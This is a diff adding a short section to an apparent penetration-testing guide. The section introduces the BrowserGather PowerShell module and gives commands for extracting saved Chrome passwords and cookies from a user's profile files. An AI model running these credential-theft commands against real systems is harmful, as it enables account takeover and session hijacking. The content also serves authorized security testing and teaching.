@@ -370,6 +370,18 @@ mimikittenz can also easily extract other kinds of juicy info from target proces
 Invoke-mimikittenz.ps1
 ```
 
+It is also possible to extract sensitive browser information through BrowserGather.
+
+[BrowserGather](https://github.com/sekirkity/BrowserGather) include various cmdlets for extracting credential, history, and cookie/session data from Google Chrome
+
+```bash
+# First import the module
+Import-Module .\BrowserGather.ps1
+
+Get-ChromeCreds "C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\<PROFILE>\Login Data"
+Get-ChromeCookies "C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\<PROFILE>\Cookies"
+```
+
 ##### Data Protection API
 
 Used by Windows to perform symmetric encryption of asymmetric private keys, using a user or system secret as a significant contribution of entropy.
